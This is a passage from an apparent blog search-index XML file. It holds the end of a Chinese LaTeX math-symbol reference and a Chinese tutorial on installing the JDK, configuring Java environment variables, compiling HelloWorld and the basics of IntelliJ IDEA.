align="center">$\sum\limits_{i&#x3D;1}^{N}$</td><td align="center">\sum\limits_{i&#x3D;1}^{N}</td></tr><tr><td align="center">$T^i_{cr}$</td><td align="center">T^i_{cr}</td></tr><tr><td align="center">$x_{i}$</td><td align="center">x_{i}</td></tr><tr><td align="center">$\frac{1}{M}$</td><td align="center">\frac{1}{M}</td></tr><tr><td align="center">$\substack{\min\N_{s}(l)}$</td><td align="center">\substack{\min\N_{s}(l)}</td></tr><tr><td align="center">$+\infty$</td><td align="center">+\infty</td></tr><tr><td align="center">$ -\infty$</td><td align="center">- \infty</td></tr><tr><td align="center">$\underset{y_{l}}{arg \ min}$</td><td align="center">\underset{y_{l}}{arg \ min}</td></tr><tr><td align="center">$\cdots$ (余数)</td><td align="center">\cdots</td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><h2 id="7、空格的表示方法"><a href="#7、空格的表示方法" class="headerlink" title="7、空格的表示方法"></a>7、空格的表示方法</h2><table><thead><tr><th align="center">符号</th><th align="center">表达方式</th><th align="center">注释</th></tr></thead><tbody><tr><td align="center">$a\quad b$</td><td align="center">a \quad b</td><td align="center">一个m宽度</td></tr><tr><td align="center">$a \qquad b$</td><td align="center">a \qquad b</td><td align="center">两个m宽度</td></tr><tr><td align="center">$a\ b$</td><td align="center">a\ b</td><td align="center">1&#x2F;3m宽度</td></tr><tr><td align="center">$a \ b$</td><td align="center">a \ b</td><td align="center">换行</td></tr></tbody></table><p>注：\quad、1em、em、m代表当前字体下接近字符‘M’的宽度。</p><h2 id="8、给字符上加内容"><a href="#8、给字符上加内容" class="headerlink" title="8、给字符上加内容"></a>8、给字符上加内容</h2><table><thead><tr><th align="center">符号</th><th align="center">表达方式</th></tr></thead><tbody><tr><td align="center">$\overline{x}$</td><td align="center">\overline{x}</td></tr><tr><td align="center">$\hat{x}$</td><td align="center">\hat{x}</td></tr><tr><td align="center">$\widetilde{x}$</td><td align="center">\widetilde{x}</td></tr><tr><td align="center">$ \dot{x}$</td><td align="center">\dot{x}</td></tr><tr><td align="center">$\ddot{x}$</td><td align="center">\ddot{x}</td></tr></tbody></table><h1 id="三、网站查询"><a href="#三、网站查询" class="headerlink" title="三、网站查询"></a>三、网站查询</h1><p>（1）<a href="https://blog.csdn.net/zgj926503/article/details/52757631">https://blog.csdn.net/zgj926503/article/details/52757631</a></p><p>（2）<a href="http://www.javashuo.com/article/p-goqanizz-gz.html">http://www.javashuo.com/article/p-goqanizz-gz.html</a></p><p>（3）<a href="https://blog.csdn.net/luolang_103/article/details/81289529">https://blog.csdn.net/luolang_103/article/details/81289529</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具箱 </category>
          
          <category> Misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java环境配置</title>
      <link href="/2022/07/12/Java%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
      <url>/2022/07/12/Java%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Java概述"><a href="#一、Java概述" class="headerlink" title="一、Java概述"></a>一、Java概述</h1><blockquote><ul><li>java是一种纯面向对象的编程语言，支持类、对象、抽象、封装、继承和多态等特性。</li><li></li><li>没有C++的指针、结构体、多重继承等等功能。</li><li>可跨平台使用，存在内存的自动垃圾收集</li></ul></blockquote><h1 id="二、下载和安装JDK"><a href="#二、下载和安装JDK" class="headerlink" title="二、下载和安装JDK"></a>二、下载和安装JDK</h1><p>说明： jdk是由sun公司提出的，内含java编译器、java运行工具、java文档生成工具、Java打包工具等等，可以说只要安装好jdk就可以编译执行java程序了。</p><p>（1）官网下载：<a href="https://www.oracle.com/java/technologies/downloads/#jdk17-windows">https://www.oracle.com/java/technologies/downloads/#jdk17-windows</a></p><p>这个链接只给出了一个版本，如果需要的是其他版本的话就要点击 早期版本</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20211209172344778.png" alt="image-20211209172344778"></p><p>（2）安装，安装时需要注意安装的路径，可默认也可以选择自己想要安装的位置。</p><h1 id="三、JDK目录介绍"><a href="#三、JDK目录介绍" class="headerlink" title="三、JDK目录介绍"></a>三、JDK目录介绍</h1><h2 id="1-bin目录"><a href="#1-bin目录" class="headerlink" title="1. bin目录"></a>1. bin目录</h2><ul><li>作用：存放一些可执行的文件</li><li>javac.exe：java的编译工具  &#x3D;&#x3D;》作用：将编写好的java文件（.java）编译成java字节码文件（.class）</li><li>java.exe：Java的运行工具  &#x3D;&#x3D;》运行编译好的java字节码文件</li><li>jar.exe：将 java 程序生成jar压缩包</li><li>javadoc.exe：为 java 程序自动生成帮助文档</li></ul><h2 id="2-jre目录"><a href="#2-jre目录" class="headerlink" title="2. jre目录"></a>2. jre目录</h2><p>是Java运行环境的根目录，包含java虚拟机、运行时的类库</p><h2 id="3-include目录"><a href="#3-include目录" class="headerlink" title="3. include目录"></a>3. include目录</h2><p>包含java启动时需要引入的C语言头文件</p><h2 id="4-lib目录"><a href="#4-lib目录" class="headerlink" title="4. lib目录"></a>4. lib目录</h2><p>包含java类库或库文件</p><h2 id="5-src-zip文件"><a href="#5-src-zip文件" class="headerlink" title="5. src.zip文件"></a>5. src.zip文件</h2><p>jak的科学类的源代码，可以通过该文件查看java基础类的源代码</p><h1 id="四-环境变量的配置"><a href="#四-环境变量的配置" class="headerlink" title="四. 环境变量的配置"></a>四. 环境变量的配置</h1><p>配置环境的作用：为了在任何路径下执行某个命令。</p><h2 id="1-配置环境变量"><a href="#1-配置环境变量" class="headerlink" title="1. 配置环境变量"></a>1. 配置环境变量</h2><ul><li><h5 id="搜索环境变量，进入"><a href="#搜索环境变量，进入" class="headerlink" title="搜索环境变量，进入"></a>搜索环境变量，进入</h5></li><li><h5 id="新建-gt-变量名”JAVA-HOME”，变量值”C-Program-Files-Java-jdk-17-0-1”（即JDK的安装路径）"><a href="#新建-gt-变量名”JAVA-HOME”，变量值”C-Program-Files-Java-jdk-17-0-1”（即JDK的安装路径）" class="headerlink" title="新建-&gt;变量名”JAVA_HOME”，变量值”C:\Program Files\Java\jdk-17.0.1”（即JDK的安装路径）"></a>新建-&gt;变量名”JAVA_HOME”，变量值”C:\Program Files\Java\jdk-17.0.1”（即JDK的安装路径）</h5></li><li><h5 id="双击-变量名”Path”，点击”新建”，然后输入上”-JAVA-HOME-bin”，点击”确定”，再次点击”新建”，然后输入上”-JAVA-HOME-jre-bin”，点击确定。"><a href="#双击-变量名”Path”，点击”新建”，然后输入上”-JAVA-HOME-bin”，点击”确定”，再次点击”新建”，然后输入上”-JAVA-HOME-jre-bin”，点击确定。" class="headerlink" title="双击 变量名”Path”，点击”新建”，然后输入上”%JAVA_HOME%\bin”，点击”确定”，再次点击”新建”，然后输入上”%JAVA_HOME%\jre\bin”，点击确定。"></a>双击 变量名”Path”，点击”新建”，然后输入上”%JAVA_HOME%\bin”，点击”确定”，再次点击”新建”，然后输入上”%JAVA_HOME%\jre\bin”，点击确定。</h5><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220801135526602.png" alt="image-20220801135526602"></p></li><li><h5 id="新建-gt-变量名”CLASSPATH”-变量值”-JAVA-HOME-lib-JAVA-HOME-lib-dt-jar-JAVA-HOME-lib-tools-jar”"><a href="#新建-gt-变量名”CLASSPATH”-变量值”-JAVA-HOME-lib-JAVA-HOME-lib-dt-jar-JAVA-HOME-lib-tools-jar”" class="headerlink" title="新建-&gt;变量名”CLASSPATH”,变量值”.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar”"></a>新建-&gt;变量名”CLASSPATH”,变量值”.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar”</h5></li><li><p>最后按确定退出</p></li><li><h5 id="检测jdk安装是否完成：进入cmd-输入java-–version，如果显示出jdk版本即证明安装完成"><a href="#检测jdk安装是否完成：进入cmd-输入java-–version，如果显示出jdk版本即证明安装完成" class="headerlink" title="检测jdk安装是否完成：进入cmd 输入java –version，如果显示出jdk版本即证明安装完成"></a>检测jdk安装是否完成：进入cmd 输入java –version，如果显示出jdk版本即证明安装完成</h5></li></ul><h2 id="2-环境变量说明"><a href="#2-环境变量说明" class="headerlink" title="2. 环境变量说明"></a>2. 环境变量说明</h2><p>（1）path环境变量</p><blockquote><p>path ： 用于保存一系列的路径，当在命令行运行一个可执行文件时，操作系统首先会在当前目录下查找是否存在该文件，存在执行，不存在则在环境变量path所定义的路径中从前往后依次寻找，找到则执行，否则系统报错。（从前往后，所以会先执行放在前面的环境）。</p><p>因为编译和执行java程序需要用到 bin目录的内容，所以设置的路径path就在C:\Program Files\Java\jdk-17.0.1\bin；至于为什么要设置JAVA_HOME，是为了简化输入的路径。最终达到在任何路径下识别java、javac、javadoc等等命令</p></blockquote><p>（2）CLASSPATH环境变量</p><blockquote><p>告诉jvm要使用或执行的class放在什么路径上，便于JVM加载class文件，</p><p>注意：.;表示当前路径，tools.jar和dt.jar为类库路径。在最开始有一个“.”   ，如果没有加上，那么java虚拟机会自动将安装目录下的bin目录作为当前目录。</p></blockquote><h1 id="四、Java的运行机制"><a href="#四、Java的运行机制" class="headerlink" title="四、Java的运行机制"></a>四、Java的运行机制</h1><h2 id="1-运行方式"><a href="#1-运行方式" class="headerlink" title="1. 运行方式"></a>1. 运行方式</h2><p>通过自己写好一个带后缀为.java的文件吗，然后通过sun公司提供的jdk 编译运行最终变成一个可执行的exe文件。     编译（javac.exe） + 运行（java.exe）</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20211209183657006-16593312617573.png" alt="image-20211209183657006"></p><h2 id="2-举例说明："><a href="#2-举例说明：" class="headerlink" title="2. 举例说明："></a>2. 举例说明：</h2><p>① 用记事本或任意一个编辑器编写一个 HelloWorld.Java的文件。然后输入：</p><pre><code class="Java">public class HelloWorld &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;Hello World&quot;);    &#125;&#125;</code></pre><p>② 使用“Javac HelloWorld.Java”命令开启Java编译器并进行编译。编译结束后，它会自动生成一个HelloWorld. class的字节码文件</p><p>③ 使用“ Java HelloWorld”命令启动Java虚拟机（JVM）运行程序，Java虚拟机首先将编译好的字节码文件加载到内存，这个过程被称为类加载，它是由类加载器完成的，然后虚拟机将加载到内存中的代码转换为与操作系统相对应的执行代码，并解释执行，执行后可以得到运行结果。</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220801135651451.png" alt="image-20220801135651451"></p><p>说明：</p><blockquote><ul><li>通过上面的分析不难发现，Java程序是由虚拟机负责解释执行的，而并非操作系统。</li><li>这样做的好处是可以实现跨平台性，也就是说针对不同的操作系统可以编写相同的程序，只需安装不同版本的虚拟机即可。</li><li>上面的程序是通过cmd命令行输入，然后编译运行编写好的java程序。但是这个方式比较麻烦，一般都是利用集成开发工具来实现的，像eclipse、idea等等</li></ul></blockquote><h1 id="五、使用Java集成开发工具IDEA"><a href="#五、使用Java集成开发工具IDEA" class="headerlink" title="五、使用Java集成开发工具IDEA"></a>五、使用Java集成开发工具IDEA</h1><h2 id="1、安装目录"><a href="#1、安装目录" class="headerlink" title="1、安装目录"></a>1、安装目录</h2><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220120012607164.png" alt="image-20220120012607164"></p><p>（1）bin：一些启动文件、配置文件</p><ul><li>idea64.exe.vmoptions：虚拟机的配置信息</li></ul><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220801135733643.png" alt="image-20220801135733643"></p><ul><li><p>Xms：初始内存，可提高启动的速度</p></li><li><p>Xmx：最大内存，降低垃圾回收的频率</p></li><li><p>ReservedCodeCacheSize：可保存代码的缓冲大小</p></li></ul><p>（2）hlep：帮助文档</p><p>（3）jbr：</p><p>（4）lib：库</p><p>（5）license：插件的一些许可信息</p><p>（6）plugins：插件2</p><h2 id="2、设置目录"><a href="#2、设置目录" class="headerlink" title="2、设置目录"></a>2、设置目录</h2><p>config目录：配置信息：文件的模板、快捷键、插件等等</p><p>system目录：缓冲数据、索引caches下</p><p>如果配置出现问题，删除这两个目录然后重启即可修改成默认的初始的状态</p><h2 id="3、获取激活码"><a href="#3、获取激活码" class="headerlink" title="3、获取激活码"></a>3、获取激活码</h2><p>参考链接：<a href="https://blog.csdn.net/weixin_46167872/article/details/122580926?spm=1001.2014.3001.5501">https://blog.csdn.net/weixin_46167872/article/details/122580926?spm=1001.2014.3001.5501</a></p><h2 id="4、设置文件头信息"><a href="#4、设置文件头信息" class="headerlink" title="4、设置文件头信息"></a>4、设置文件头信息</h2><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220120201030151.png" alt="image-20220120201030151"></p><pre><code class="java">/*** @description:* @author: swedsn* @time: $&#123;DATE&#125;-$&#123;TIME&#125;*/</code></pre><h1 id="六、-JDK、JRE、JVM的作用及区别"><a href="#六、-JDK、JRE、JVM的作用及区别" class="headerlink" title="六、 JDK、JRE、JVM的作用及区别"></a>六、 JDK、JRE、JVM的作用及区别</h1><p>具体去查看：<a href="https://blog.csdn.net/qq_33862644/article/details/81182344">https://blog.csdn.net/qq_33862644/article/details/81182344</a></p><p>（1）JDK：</p><ul><li><p>JDK是Java开发工具包，是Sun Microsystems针对Java开发员的产品。是用来给开发人员使用的</p></li><li><p>JDK包含java运行环境JRE、一堆Java工具（javac、java、jdb）、Java的基础类库</p></li></ul><p>（2）JRE</p><ul><li>JRE 是运行基于Java语言编写的程序所不可缺少的运行环境。</li><li>JRE中包含是运行Java程序的必要组件，如JVM。并没有包含任何开发工具（如编译器和调试器），是来给普通用户使用的</li></ul><p>（3）JVM</p><ul><li><p>JVM就是Java虚拟机，是整个java实现跨平台的最核心的部分。所有的Java程序首先会被编译成.class的文件，这种文件可以在虚拟机上面执行，就是说程序通过虚拟机将程序解释给操作系统听。</p></li><li><p>只有JVM还不能成class的执行，因为在解释class的时候JVM需要调用解释所需要的类库lib，而jre包含lib类库。</p></li><li><p>JVM屏蔽了与具体操作系统平台相关的信息，使得Java程序只需生成在Java虚拟机上运行的目标代码（字节码），就可以在多种平台上不加修改地运行。</p></li><li><p>所有的程序只要有java虚拟机的支持，那么就可以实现程序的执行，并且不同的操作系统上会有不同版本的jvm。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> Java开发 </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
